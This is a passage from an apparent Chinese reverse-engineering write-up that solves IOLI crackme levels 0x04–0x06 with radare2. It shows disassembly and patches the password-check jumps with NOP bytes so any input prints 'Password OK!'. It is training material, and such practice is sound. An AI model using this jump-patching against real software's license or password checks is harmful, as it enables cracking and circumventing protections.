|          <span class="number">0x08048509</span>    <span class="number">55</span>           <span class="keyword">push</span> <span class="literal">ebp</span>
|          <span class="number">0x0804850a</span>    89e5         <span class="keyword">mov</span> <span class="literal">ebp</span>, <span class="literal">esp</span>
|          <span class="number">0x0804850c</span>    81ec88000000 <span class="keyword">sub</span> <span class="literal">esp</span>, <span class="number">0x88</span>
|          <span class="number">0x08048512</span>    83e4f0       <span class="keyword">and</span> <span class="literal">esp</span>, <span class="number">0xfffffff0</span>
|          <span class="number">0x08048515</span>    b800000000   <span class="keyword">mov</span> <span class="literal">eax</span>, <span class="number">0x0</span>
|          <span class="number">0x0804851a</span>    83c00f       <span class="keyword">add</span> <span class="literal">eax</span>, <span class="number">0xf</span>
|          <span class="number">0x0804851d</span>    83c00f       <span class="keyword">add</span> <span class="literal">eax</span>, <span class="number">0xf</span>
|          <span class="number">0x08048520</span>    c1e804       <span class="keyword">shr</span> <span class="literal">eax</span>, <span class="number">0x4</span>
|          <span class="number">0x08048523</span>    c1e004       <span class="keyword">shl</span> <span class="literal">eax</span>, <span class="number">0x4</span>
|          <span class="number">0x08048526</span>    29c4         <span class="keyword">sub</span> <span class="literal">esp</span>, <span class="literal">eax</span>
|          <span class="number">0x08048528</span>    c704245e860. <span class="keyword">mov</span> <span class="preprocessor">dword</span> [<span class="literal">esp</span>], <span class="keyword">str</span>.IOLI_Crackme_Level_0x04_n <span class="comment">; str.IOLI_Crackme_Level_0x04_n</span>
|          <span class="number">0x0804852f</span>    e860feffff   <span class="keyword">call</span> sym.imp.printf
|             sym.imp.printf(unk)
|          <span class="number">0x08048534</span>    c7042477860. <span class="keyword">mov</span> <span class="preprocessor">dword</span> [<span class="literal">esp</span>], <span class="keyword">str</span>.Password_ <span class="comment">; str.Password_</span>
|          <span class="number">0x0804853b</span>    e854feffff   <span class="keyword">call</span> sym.imp.printf
|             sym.imp.printf()
|          <span class="number">0x08048540</span>    8d4588       <span class="keyword">lea</span> <span class="literal">eax</span>, [<span class="literal">ebp</span>-<span class="number">0x78</span>]
|          <span class="number">0x08048543</span>    <span class="number">89442404</span>     <span class="keyword">mov</span> [<span class="literal">esp</span>+<span class="number">0x4</span>], <span class="literal">eax</span>
|          <span class="number">0x08048547</span>    c7042482860. <span class="keyword">mov</span> <span class="preprocessor">dword</span> [<span class="literal">esp</span>], <span class="number">0x8048682</span> <span class="comment">;  0x08048682 </span>
|          <span class="number">0x0804854e</span>    e821feffff   <span class="keyword">call</span> sym.imp.scanf
|             sym.imp.scanf()
|          <span class="number">0x08048553</span>    8d4588       <span class="keyword">lea</span> <span class="literal">eax</span>, [<span class="literal">ebp</span>-<span class="number">0x78</span>]
|          <span class="number">0x08048556</span>    <span class="number">890424</span>       <span class="keyword">mov</span> [<span class="literal">esp</span>], <span class="literal">eax</span>
|          <span class="number">0x08048559</span>    e826ffffff   <span class="keyword">call</span> sym.check
|             sym.check()
|          <span class="number">0x0804855e</span>    b800000000   <span class="keyword">mov</span> <span class="literal">eax</span>, <span class="number">0x0</span>
|          <span class="number">0x08048563</span>    c9           <span class="keyword">leave</span>
\          <span class="number">0x08048564</span>    c3           <span class="keyword">ret</span>
[<span class="number">0x080483d0</span>]&gt; pdf@sym.check
|          <span class="comment">; CALL XREF from 0x08048559 (unk)</span>
/ (fcn) sym.check <span class="number">133</span>
|          <span class="number">0x08048484</span>    <span class="number">55</span>           <span class="keyword">push</span> <span class="literal">ebp</span>
|          <span class="number">0x08048485</span>    89e5         <span class="keyword">mov</span> <span class="literal">ebp</span>, <span class="literal">esp</span>
|          <span class="number">0x08048487</span>    83ec28       <span class="keyword">sub</span> <span class="literal">esp</span>, <span class="number">0x28</span>
|          <span class="number">0x0804848a</span>    c745f800000. <span class="keyword">mov</span> <span class="preprocessor">dword</span> [<span class="literal">ebp</span>-<span class="number">0x8</span>], <span class="number">0x0</span>
|          <span class="number">0x08048491</span>    c745f400000. <span class="keyword">mov</span> <span class="preprocessor">dword</span> [<span class="literal">ebp</span>-<span class="number">0xc</span>], <span class="number">0x0</span>
|    .---&gt; <span class="number">0x08048498</span>    8b4508       <span class="keyword">mov</span> <span class="literal">eax</span>, [<span class="literal">ebp</span>+<span class="number">0x8</span>]
|    |     <span class="number">0x0804849b</span>    <span class="number">890424</span>       <span class="keyword">mov</span> [<span class="literal">esp</span>], <span class="literal">eax</span>
|    |     <span class="number">0x0804849e</span>    e8e1feffff   <span class="keyword">call</span> sym.imp.strlen <span class="comment">; (fcn.0804837a)</span>
|    |        fcn.0804837a(unk) <span class="comment">; sym.imp.strlen</span>
|    |     <span class="number">0x080484a3</span>    3945f4       <span class="keyword">cmp</span> [<span class="literal">ebp</span>-<span class="number">0xc</span>], <span class="literal">eax</span>
|    | ,=&lt; <span class="number">0x080484a6</span>    <span class="number">7353</span>         <span class="keyword">jae</span> <span class="number">0x80484fb</span>
|    | |   <span class="number">0x080484a8</span>    8b45f4       <span class="keyword">mov</span> <span class="literal">eax</span>, [<span class="literal">ebp</span>-<span class="number">0xc</span>]
|    | |   <span class="number">0x080484ab</span>    <span class="number">034508</span>       <span class="keyword">add</span> <span class="literal">eax</span>, [<span class="literal">ebp</span>+<span class="number">0x8</span>]
|    | |   <span class="number">0x080484ae</span>    0fb600       <span class="keyword">movzx</span> <span class="literal">eax</span>, <span class="preprocessor">byte</span> [<span class="literal">eax</span>]
|    | |   <span class="number">0x080484b1</span>    8845f3       <span class="keyword">mov</span> [<span class="literal">ebp</span>-<span class="number">0xd</span>], <span class="literal">al</span>
|    | |   <span class="number">0x080484b4</span>    8d45fc       <span class="keyword">lea</span> <span class="literal">eax</span>, [<span class="literal">ebp</span>-<span class="number">0x4</span>]
|    | |   <span class="number">0x080484b7</span>    <span class="number">89442408</span>     <span class="keyword">mov</span> [<span class="literal">esp</span>+<span class="number">0x8</span>], <span class="literal">eax</span>
|    | |   <span class="number">0x080484bb</span>    c7442404388. <span class="keyword">mov</span> <span class="preprocessor">dword</span> [<span class="literal">esp</span>+<span class="number">0x4</span>], <span class="number">0x8048638</span> <span class="comment">;  0x08048638 </span>
|    | |   <span class="number">0x080484c3</span>    8d45f3       <span class="keyword">lea</span> <span class="literal">eax</span>, [<span class="literal">ebp</span>-<span class="number">0xd</span>]
|    | |   <span class="number">0x080484c6</span>    <span class="number">890424</span>       <span class="keyword">mov</span> [<span class="literal">esp</span>], <span class="literal">eax</span>
|    | |   <span class="number">0x080484c9</span>    e8d6feffff   <span class="keyword">call</span> sym.imp.sscanf <span class="comment">; (fcn.0804839a)</span>
|    | |      fcn.0804839a() <span class="comment">; sym.imp.sscanf</span>
|    | |   <span class="number">0x080484ce</span>    8b55fc       <span class="keyword">mov</span> <span class="literal">edx</span>, [<span class="literal">ebp</span>-<span class="number">0x4</span>]
|    | |   <span class="number">0x080484d1</span>    8d45f8       <span class="keyword">lea</span> <span class="literal">eax</span>, [<span class="literal">ebp</span>-<span class="number">0x8</span>]
|    | |   <span class="number">0x080484d4</span>    <span class="number">0110</span>         <span class="keyword">add</span> [<span class="literal">eax</span>], <span class="literal">edx</span>
|    | |   <span class="number">0x080484d6</span>    837df80f     <span class="keyword">cmp</span> <span class="preprocessor">dword</span> [<span class="literal">ebp</span>-<span class="number">0x8</span>], <span class="number">0xf</span>
|    |,==&lt; <span class="number">0x080484da</span>    <span class="number">7518</span>         <span class="keyword">jne</span> <span class="number">0x80484f4</span>
|    |||   <span class="number">0x080484dc</span>    c704243b860. <span class="keyword">mov</span> <span class="preprocessor">dword</span> [<span class="literal">esp</span>], <span class="keyword">str</span>.Password_OK__n <span class="comment">; str.Password_OK__n</span>
|    |||   <span class="number">0x080484e3</span>    e8acfeffff   <span class="keyword">call</span> sym.imp.printf
|    |||      sym.imp.printf()
|    |||   <span class="number">0x080484e8</span>    c7042400000. <span class="keyword">mov</span> <span class="preprocessor">dword</span> [<span class="literal">esp</span>], <span class="number">0x0</span>
|    |||   <span class="number">0x080484ef</span>    e8c0feffff   <span class="keyword">call</span> sym.imp.exit <span class="comment">; (fcn.080483aa)</span>
|    |||      fcn.080483aa() <span class="comment">; sym.imp.exit</span>
|    |<span class="string">`--&gt; 0x080484f4    8d45f4       lea eax, [ebp-0xc]
|    | |   0x080484f7    ff00         inc dword [eax]
|    `</span>===&lt; <span class="number">0x080484f9</span>    eb9d         <span class="keyword">jmp</span> <span class="number">0x8048498</span> <span class="comment">; (sym.check)</span>
|      |   <span class="comment">; JMP XREF from 0x080484a6 (unk)</span>
|      <span class="string">`-&gt; 0x080484fb    c7042449860. mov dword [esp], str.Password_Incorrect__n ; str.Password_Incorrect__n
|          0x08048502    e88dfeffff   call sym.imp.printf
|             sym.imp.printf()
|          0x08048507    c9           leave
\          0x08048508    c3           ret
[0x080483d0]&gt; s 0x080484da
[0x080484da]&gt; wx 9090
[0x080484da]&gt; q</span>
</code></pre><p>输入任何密码：</p>
<pre><code> ~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/reverse/</span>IOLI-crackme<span class="regexp">/bin-linux ⮀ ./</span>crackme0x04
IOLI Crackme Level <span class="number">0</span>x04
Password: aaaaa
Password OK!
</code></pre><h2 id="crackme0x05">crackme0x05</h2><pre><code> ~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/reverse/</span>IOLI-crackme<span class="regexp">/bin-linux ⮀ ./</span>crackme0x05
IOLI Crackme Level <span class="number">0</span>x05
Password: <span class="number">12345</span>
Password Incorrect!
</code></pre><p><code>sym.parell</code>? 在三个地方都有判断，更改到让程序直接执行到<code>OK</code>字符串位置。</p>
<pre><code> ~/Work/project/reverse/IOLI-crackme/bin-linux ⮀ r2 -w ./crackme0x05
 -- Use -e bin.strings=<span class="literal">false</span> to disable search <span class="keyword">for</span> strings when loading the binary.
[<span class="number">0x080483d0</span>]&gt; aa
[<span class="number">0x080483d0</span>]&gt; pdf@sym.main
|          ; UNKNOWN XREF from <span class="number">0x080484ea</span> (unk)
|          ; DATA XREF from <span class="number">0x080483e7</span> (fcn<span class="number">.080483</span>ba)
/ (fcn) sym.main <span class="number">92</span>
|          <span class="number">0x08048540</span>    <span class="number">55</span>           push ebp
|          <span class="number">0x08048541</span>    <span class="number">89e5</span>         mov ebp, esp
|          <span class="number">0x08048543</span>    <span class="number">81</span>ec88000000 sub esp, <span class="number">0x88</span>
|          <span class="number">0x08048549</span>    <span class="number">83e4</span>f0       and esp, <span class="number">0xfffffff0</span>
|          <span class="number">0x0804854c</span>    b800000000   mov eax, <span class="number">0x0</span>
|          <span class="number">0x08048551</span>    <span class="number">83</span>c00f       add eax, <span class="number">0xf</span>
|          <span class="number">0x08048554</span>    <span class="number">83</span>c00f       add eax, <span class="number">0xf</span>
|          <span class="number">0x08048557</span>    c1e804       shr eax, <span class="number">0x4</span>
|          <span class="number">0x0804855a</span>    c1e004       shl eax, <span class="number">0x4</span>
|          <span class="number">0x0804855d</span>    <span class="number">29</span>c4         sub esp, eax
|          <span class="number">0x0804855f</span>    c704248e860. mov dword [esp], str.IOLI_Crackme_Level_0x05_n ; str.IOLI_Crackme_Level_0x05_n
|          <span class="number">0x08048566</span>    e829feffff   call sym.imp.<span class="built_in">printf</span>
|             sym.imp.<span class="built_in">printf</span>(unk)
|          <span class="number">0x0804856b</span>    c70424a7860. mov dword [esp], str.Password_ ; str.Password_
|          <span class="number">0x08048572</span>    e81dfeffff   call sym.imp.<span class="built_in">printf</span>
|             sym.imp.<span class="built_in">printf</span>()
|          <span class="number">0x08048577</span>    <span class="number">8</span>d4588       lea eax, [ebp-<span class="number">0x78</span>]
|          <span class="number">0x0804857a</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|          <span class="number">0x0804857e</span>    c70424b2860. mov dword [esp], <span class="number">0x80486b2</span> ;  <span class="number">0x080486b2</span> 
|          <span class="number">0x08048585</span>    e8eafdffff   call sym.imp.<span class="built_in">scanf</span>
|             sym.imp.<span class="built_in">scanf</span>()
|          <span class="number">0x0804858a</span>    <span class="number">8</span>d4588       lea eax, [ebp-<span class="number">0x78</span>]
|          <span class="number">0x0804858d</span>    <span class="number">890424</span>       mov [esp], eax
|          <span class="number">0x08048590</span>    e833ffffff   call sym.check
|             sym.check()
|          <span class="number">0x08048595</span>    b800000000   mov eax, <span class="number">0x0</span>
|          <span class="number">0x0804859a</span>    c9           leave
\          <span class="number">0x0804859b</span>    c3           ret
[<span class="number">0x080483d0</span>]&gt; pdf@sym.check 
|   |      ; UNKNOWN XREF from <span class="number">0x080484c8</span> (unk)
|   |      ; CALL XREF from <span class="number">0x08048590</span> (unk)
/ (fcn) sym.check <span class="number">120</span>
|   |      <span class="number">0x080484c8</span>    <span class="number">55</span>           push ebp
|   |      <span class="number">0x080484c9</span>    <span class="number">89e5</span>         mov ebp, esp
|   |      <span class="number">0x080484cb</span>    <span class="number">83</span>ec28       sub esp, <span class="number">0x28</span>
|   |      <span class="number">0x080484ce</span>    c745f800000. mov dword [ebp-<span class="number">0x8</span>], <span class="number">0x0</span>
|   |      <span class="number">0x080484d5</span>    c745f400000. mov dword [ebp-<span class="number">0xc</span>], <span class="number">0x0</span>
|   |      ; JMP XREF from <span class="number">0x08048530</span> (unk)
|- loc<span class="number">.080484</span>dc <span class="number">100</span>
|   |.---&gt; <span class="number">0x080484dc</span>    <span class="number">8</span>b4508       mov eax, [ebp+<span class="number">0x8</span>]
|   ||     <span class="number">0x080484df</span>    <span class="number">890424</span>       mov [esp], eax
|   ||     <span class="number">0x080484e2</span>    e89dfeffff   call sym.imp.<span class="built_in">strlen</span>
|   ||        sym.imp.<span class="built_in">strlen</span>(unk)
|   ||     <span class="number">0x080484e7</span>    <span class="number">3945f</span>4       cmp [ebp-<span class="number">0xc</span>], eax
|   || ,=&lt; <span class="number">0x080484ea</span>    <span class="number">7346</span>         jae loc<span class="number">.08048532</span>
|   || |   <span class="number">0x080484ec</span>    <span class="number">8</span>b45f4       mov eax, [ebp-<span class="number">0xc</span>]
|   || |   <span class="number">0x080484ef</span>    <span class="number">034508</span>       add eax, [ebp+<span class="number">0x8</span>]
|   || |   <span class="number">0x080484f2</span>    <span class="number">0f</span>b600       movzx eax, byte [eax]
|   || |   <span class="number">0x080484f5</span>    <span class="number">8845f</span>3       mov [ebp-<span class="number">0xd</span>], al
|   || |   <span class="number">0x080484f8</span>    <span class="number">8</span>d45fc       lea eax, [ebp-<span class="number">0x4</span>]
|   || |   <span class="number">0x080484fb</span>    <span class="number">89442408</span>     mov [esp+<span class="number">0x8</span>], eax
|   || |   <span class="number">0x080484ff</span>    c7442404688. mov dword [esp+<span class="number">0x4</span>], <span class="number">0x8048668</span> ;  <span class="number">0x08048668</span> 
|   || |   <span class="number">0x08048507</span>    <span class="number">8</span>d45f3       lea eax, [ebp-<span class="number">0xd</span>]
|   || |   <span class="number">0x0804850a</span>    <span class="number">890424</span>       mov [esp], eax
|   || |   <span class="number">0x0804850d</span>    e892feffff   call sym.imp.<span class="built_in">sscanf</span>
|   || |      sym.imp.<span class="built_in">sscanf</span>()
|   || |   <span class="number">0x08048512</span>    <span class="number">8</span>b55fc       mov edx, [ebp-<span class="number">0x4</span>]
|   || |   <span class="number">0x08048515</span>    <span class="number">8</span>d45f8       lea eax, [ebp-<span class="number">0x8</span>]
|   || |   <span class="number">0x08048518</span>    <span class="number">0110</span>         add [eax], edx
|   || |   <span class="number">0x0804851a</span>    <span class="number">837</span>df810     cmp dword [ebp-<span class="number">0x8</span>], <span class="number">0x10</span>
|   ||,==&lt; <span class="number">0x0804851e</span>    <span class="number">750</span>b         jne loc<span class="number">.0804852</span>b
|   ||||   <span class="number">0x08048520</span>    <span class="number">8</span>b4508       mov eax, [ebp+<span class="number">0x8</span>]
|   ||||   <span class="number">0x08048523</span>    <span class="number">890424</span>       mov [esp], eax
|   ||||   <span class="number">0x08048526</span>    e859ffffff   call sym.parell
|   ||||      sym.parell()
|   |||    ; JMP XREF from <span class="number">0x0804851e</span> (unk)
|- loc<span class="number">.0804852</span>b <span class="number">21</span>
|   ||`--&gt; <span class="number">0x0804852b</span>    <span class="number">8</span>d45f4       lea eax, [ebp-<span class="number">0xc</span>]
|   || |   <span class="number">0x0804852e</span>    ff00         inc dword [eax]
|   |`===&lt; <span class="number">0x08048530</span>    ebaa         jmp loc<span class="number">.080484</span>dc
|   |  |   ; JMP XREF from <span class="number">0x080484ea</span> (unk)
|- loc<span class="number">.08048532</span> <span class="number">14</span>
|   |  `-&gt; <span class="number">0x08048532</span>    c7042479860. mov dword [esp], str.Password_Incorrect__n ; str.Password_Incorrect__n
|          <span class="number">0x08048539</span>    e856feffff   call sym.imp.<span class="built_in">printf</span>
|             sym.imp.<span class="built_in">printf</span>()
|          <span class="number">0x0804853e</span>    c9           leave
\          <span class="number">0x0804853f</span>    c3           ret
[<span class="number">0x080483d0</span>]&gt; pdf@sym.parell 
|          ; CALL XREF from <span class="number">0x08048526</span> (unk)
/ (fcn) sym.parell <span class="number">68</span>
|          <span class="number">0x08048484</span>    <span class="number">55</span>           push ebp
|          <span class="number">0x08048485</span>    <span class="number">89e5</span>         mov ebp, esp
|          <span class="number">0x08048487</span>    <span class="number">83</span>ec18       sub esp, <span class="number">0x18</span>
|          <span class="number">0x0804848a</span>    <span class="number">8</span>d45fc       lea eax, [ebp-<span class="number">0x4</span>]
|          <span class="number">0x0804848d</span>    <span class="number">89442408</span>     mov [esp+<span class="number">0x8</span>], eax
|          <span class="number">0x08048491</span>    c7442404688. mov dword [esp+<span class="number">0x4</span>], <span class="number">0x8048668</span> ;  <span class="number">0x08048668</span> 
|          <span class="number">0x08048499</span>    <span class="number">8</span>b4508       mov eax, [ebp+<span class="number">0x8</span>]
|          <span class="number">0x0804849c</span>    <span class="number">890424</span>       mov [esp], eax
|          <span class="number">0x0804849f</span>    e800ffffff   call sym.imp.<span class="built_in">sscanf</span>
|             sym.imp.<span class="built_in">sscanf</span>(unk)
|          <span class="number">0x080484a4</span>    <span class="number">8</span>b45fc       mov eax, [ebp-<span class="number">0x4</span>]
|          <span class="number">0x080484a7</span>    <span class="number">83e001</span>       and eax, <span class="number">0x1</span>
|          <span class="number">0x080484aa</span>    <span class="number">85</span>c0         test eax, eax
|      ,=&lt; <span class="number">0x080484ac</span>    <span class="number">7518</span>         jne <span class="number">0x80484c6</span>
|      |   <span class="number">0x080484ae</span>    c704246b860. mov dword [esp], str.Password_OK__n ; str.Password_OK__n
|      |   <span class="number">0x080484b5</span>    e8dafeffff   call sym.imp.<span class="built_in">printf</span>
|      |      sym.imp.<span class="built_in">printf</span>()
|      |   <span class="number">0x080484ba</span>    c7042400000. mov dword [esp], <span class="number">0x0</span>
|      |   <span class="number">0x080484c1</span>    e8eefeffff   call sym.imp.<span class="built_in">exit</span> ; (fcn<span class="number">.080483</span>aa)
|      |      fcn<span class="number">.080483</span>aa() ; sym.imp.<span class="built_in">exit</span>
|      |   ; JMP XREF from <span class="number">0x080484ac</span> (unk)
|      `-&gt; <span class="number">0x080484c6</span>    c9           leave
\          <span class="number">0x080484c7</span>    c3           ret
[<span class="number">0x080483d0</span>]&gt; s <span class="number">0x080484ea</span>
[<span class="number">0x080484ea</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x080484ea</span>]&gt; s <span class="number">0x0804851e</span>
[<span class="number">0x0804851e</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x0804851e</span>]&gt; s <span class="number">0x080484ac</span>
[<span class="number">0x080484ac</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x080484ac</span>]&gt; q
</code></pre><p>输入任意密码</p>
<pre><code> ✘ ⮀ ~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/reverse/</span>IOLI-crackme<span class="regexp">/bin-linux ⮀ ./</span>crackme0x05      
IOLI Crackme Level <span class="number">0</span>x05
Password: <span class="number">12345</span>
Password OK!
</code></pre><h2 id="crackme0x06">crackme0x06</h2><pre><code> ~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/reverse/</span>IOLI-crackme<span class="regexp">/bin-linux ⮀ ./</span>crackme0x06
IOLI Crackme Level <span class="number">0</span>x06
Password: <span class="number">12345</span>
Password Incorrect!
</code></pre><p>破解么，又不需要知道程序逻辑，只要让程序运行到想要的代码块就好。于是……把所有跳转灭掉。</p>
<pre><code> ~/Work/project/reverse/IOLI-crackme/bin-linux ⮀ r2 -w ./crackme0x06
 -- Dissasemble? No dissasemble, no dissassemble!!!!!
[<span class="number">0x08048400</span>]&gt; aa
[<span class="number">0x08048400</span>]&gt; pdf@sym.main
|          ; UNKNOWN XREF from <span class="number">0x080485aa</span> (unk)
|          ; DATA XREF from <span class="number">0x08048417</span> (fcn<span class="number">.080483</span>ee)
/ (fcn) sym.main <span class="number">99</span>
|          <span class="number">0x08048607</span>    <span class="number">55</span>           push ebp
|          <span class="number">0x08048608</span>    <span class="number">89e5</span>         mov ebp, esp
|          <span class="number">0x0804860a</span>    <span class="number">81</span>ec88000000 sub esp, <span class="number">0x88</span>
|          <span class="number">0x08048610</span>    <span class="number">83e4</span>f0       and esp, <span class="number">0xfffffff0</span>
|          <span class="number">0x08048613</span>    b800000000   mov eax, <span class="number">0x0</span>
|          <span class="number">0x08048618</span>    <span class="number">83</span>c00f       add eax, <span class="number">0xf</span>
|          <span class="number">0x0804861b</span>    <span class="number">83</span>c00f       add eax, <span class="number">0xf</span>
|          <span class="number">0x0804861e</span>    c1e804       shr eax, <span class="number">0x4</span>
|          <span class="number">0x08048621</span>    c1e004       shl eax, <span class="number">0x4</span>
|          <span class="number">0x08048624</span>    <span class="number">29</span>c4         sub esp, eax
|          <span class="number">0x08048626</span>    c7042463870. mov dword [esp], str.IOLI_Crackme_Level_0x06_n ; str.IOLI_Crackme_Level_0x06_n
|          <span class="number">0x0804862d</span>    e886fdffff   call sym.imp.<span class="built_in">printf</span>
|             sym.imp.<span class="built_in">printf</span>(unk)
|          <span class="number">0x08048632</span>    c704247c870. mov dword [esp], str.Password_ ; str.Password_
|          <span class="number">0x08048639</span>    e87afdffff   call sym.imp.<span class="built_in">printf</span>
|             sym.imp.<span class="built_in">printf</span>()
|          <span class="number">0x0804863e</span>    <span class="number">8</span>d4588       lea eax, [ebp-<span class="number">0x78</span>]
|          <span class="number">0x08048641</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|          <span class="number">0x08048645</span>    c7042487870. mov dword [esp], <span class="number">0x8048787</span> ;  <span class="number">0x08048787</span> 
|          <span class="number">0x0804864c</span>    e847fdffff   call sym.imp.<span class="built_in">scanf</span>
|             sym.imp.<span class="built_in">scanf</span>()
|          <span class="number">0x08048651</span>    <span class="number">8</span>b4510       mov eax, [ebp+<span class="number">0x10</span>]
|          <span class="number">0x08048654</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|          <span class="number">0x08048658</span>    <span class="number">8</span>d4588       lea eax, [ebp-<span class="number">0x78</span>]
|          <span class="number">0x0804865b</span>    <span class="number">890424</span>       mov [esp], eax
|          <span class="number">0x0804865e</span>    e825ffffff   call sym.check
|             sym.check()
|          <span class="number">0x08048663</span>    b800000000   mov eax, <span class="number">0x0</span>
|          <span class="number">0x08048668</span>    c9           leave
\          <span class="number">0x08048669</span>    c3           ret
[<span class="number">0x08048400</span>]&gt; pdf@sym.check 
|          ; UNKNOWN XREF from <span class="number">0x0804854e</span> (unk)
|          ; CALL XREF from <span class="number">0x0804865e</span> (unk)
/ (fcn) sym.check <span class="number">127</span>
|          <span class="number">0x08048588</span>    <span class="number">55</span>           push ebp
|          <span class="number">0x08048589</span>    <span class="number">89e5</span>         mov ebp, esp
|          <span class="number">0x0804858b</span>    <span class="number">83</span>ec28       sub esp, <span class="number">0x28</span>
|          <span class="number">0x0804858e</span>    c745f800000. mov dword [ebp-<span class="number">0x8</span>], <span class="number">0x0</span>
|          <span class="number">0x08048595</span>    c745f400000. mov dword [ebp-<span class="number">0xc</span>], <span class="number">0x0</span>
|          ; JMP XREF from <span class="number">0x080485f7</span> (unk)
|- loc<span class="number">.0804859</span>c <span class="number">107</span>
|    .---&gt; <span class="number">0x0804859c</span>    <span class="number">8</span>b4508       mov eax, [ebp+<span class="number">0x8</span>]
|    |     <span class="number">0x0804859f</span>    <span class="number">890424</span>       mov [esp], eax
|    |     <span class="number">0x080485a2</span>    e801feffff   call sym.imp.<span class="built_in">strlen</span>
|    |        sym.imp.<span class="built_in">strlen</span>(unk)
|    |     <span class="number">0x080485a7</span>    <span class="number">3945f</span>4       cmp [ebp-<span class="number">0xc</span>], eax
|    | ,=&lt; <span class="number">0x080485aa</span>    <span class="number">734</span>d         jae loc<span class="number">.080485f</span>9
|    | |   <span class="number">0x080485ac</span>    <span class="number">8</span>b45f4       mov eax, [ebp-<span class="number">0xc</span>]
|    | |   <span class="number">0x080485af</span>    <span class="number">034508</span>       add eax, [ebp+<span class="number">0x8</span>]
|    | |   <span class="number">0x080485b2</span>    <span class="number">0f</span>b600       movzx eax, byte [eax]
|    | |   <span class="number">0x080485b5</span>    <span class="number">8845f</span>3       mov [ebp-<span class="number">0xd</span>], al
|    | |   <span class="number">0x080485b8</span>    <span class="number">8</span>d45fc       lea eax, [ebp-<span class="number">0x4</span>]
|    | |   <span class="number">0x080485bb</span>    <span class="number">89442408</span>     mov [esp+<span class="number">0x8</span>], eax
|    | |   <span class="number">0x080485bf</span>    c74424043d8. mov dword [esp+<span class="number">0x4</span>], <span class="number">0x804873d</span> ;  <span class="number">0x0804873d</span> 
|    | |   <span class="number">0x080485c7</span>    <span class="number">8</span>d45f3       lea eax, [ebp-<span class="number">0xd</span>]
|    | |   <span class="number">0x080485ca</span>    <span class="number">890424</span>       mov [esp], eax
|    | |   <span class="number">0x080485cd</span>    e8f6fdffff   call sym.imp.<span class="built_in">sscanf</span>
|    | |      sym.imp.<span class="built_in">sscanf</span>()
|    | |   <span class="number">0x080485d2</span>    <span class="number">8</span>b55fc       mov edx, [ebp-<span class="number">0x4</span>]
|    | |   <span class="number">0x080485d5</span>    <span class="number">8</span>d45f8       lea eax, [ebp-<span class="number">0x8</span>]
|    | |   <span class="number">0x080485d8</span>    <span class="number">0110</span>         add [eax], edx
|    | |   <span class="number">0x080485da</span>    <span class="number">837</span>df810     cmp dword [ebp-<span class="number">0x8</span>], <span class="number">0x10</span>
|    |,==&lt; <span class="number">0x080485de</span>    <span class="number">7512</span>         jne loc<span class="number">.080485f</span>2
|    |||   <span class="number">0x080485e0</span>    <span class="number">8</span>b450c       mov eax, [ebp+<span class="number">0xc</span>]
|    |||   <span class="number">0x080485e3</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|    |||   <span class="number">0x080485e7</span>    <span class="number">8</span>b4508       mov eax, [ebp+<span class="number">0x8</span>]
|    |||   <span class="number">0x080485ea</span>    <span class="number">890424</span>       mov [esp], eax
|    |||   <span class="number">0x080485ed</span>    e828ffffff   call sym.parell
|    |||      sym.parell()
|    ||    ; JMP XREF from <span class="number">0x080485de</span> (unk)
|- loc<span class="number">.080485f</span>2 <span class="number">21</span>
|    |`--&gt; <span class="number">0x080485f2</span>    <span class="number">8</span>d45f4       lea eax, [ebp-<span class="number">0xc</span>]
|    | |   <span class="number">0x080485f5</span>    ff00         inc dword [eax]
|    `===&lt; <span class="number">0x080485f7</span>    eba3         jmp loc<span class="number">.0804859</span>c
|      |   ; JMP XREF from <span class="number">0x080485aa</span> (unk)
|- loc<span class="number">.080485f</span>9 <span class="number">14</span>
|      `-&gt; <span class="number">0x080485f9</span>    c704244e870. mov dword [esp], str.Password_Incorrect__n ; str.Password_Incorrect__n
|          <span class="number">0x08048600</span>    e8b3fdffff   call sym.imp.<span class="built_in">printf</span>
|             sym.imp.<span class="built_in">printf</span>()
|          <span class="number">0x08048605</span>    c9           leave
\          <span class="number">0x08048606</span>    c3           ret
[<span class="number">0x08048400</span>]&gt; pdf@sym.parell 
|          ; UNKNOWN XREF from <span class="number">0x0804851a</span> (unk)
|          ; CALL XREF from <span class="number">0x080485ed</span> (unk)
/ (fcn) sym.parell <span class="number">110</span>
|          <span class="number">0x0804851a</span>    <span class="number">55</span>           push ebp
|          <span class="number">0x0804851b</span>    <span class="number">89e5</span>         mov ebp, esp
|          <span class="number">0x0804851d</span>    <span class="number">83</span>ec18       sub esp, <span class="number">0x18</span>
|          <span class="number">0x08048520</span>    <span class="number">8</span>d45fc       lea eax, [ebp-<span class="number">0x4</span>]
|          <span class="number">0x08048523</span>    <span class="number">89442408</span>     mov [esp+<span class="number">0x8</span>], eax
|          <span class="number">0x08048527</span>    c74424043d8. mov dword [esp+<span class="number">0x4</span>], <span class="number">0x804873d</span> ;  <span class="number">0x0804873d</span> 
|          <span class="number">0x0804852f</span>    <span class="number">8</span>b4508       mov eax, [ebp+<span class="number">0x8</span>]
|          <span class="number">0x08048532</span>    <span class="number">890424</span>       mov [esp], eax
|          <span class="number">0x08048535</span>    e88efeffff   call sym.imp.<span class="built_in">sscanf</span>
|             sym.imp.<span class="built_in">sscanf</span>(unk)
|          <span class="number">0x0804853a</span>    <span class="number">8</span>b450c       mov eax, [ebp+<span class="number">0xc</span>]
|          <span class="number">0x0804853d</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|          <span class="number">0x08048541</span>    <span class="number">8</span>b45fc       mov eax, [ebp-<span class="number">0x4</span>]
|          <span class="number">0x08048544</span>    <span class="number">890424</span>       mov [esp], eax
|          <span class="number">0x08048547</span>    e868ffffff   call sym.dummy
|             sym.dummy()
|          <span class="number">0x0804854c</span>    <span class="number">85</span>c0         test eax, eax
|      ,=&lt; <span class="number">0x0804854e</span>    <span class="number">7436</span>         je loc<span class="number">.08048586</span>
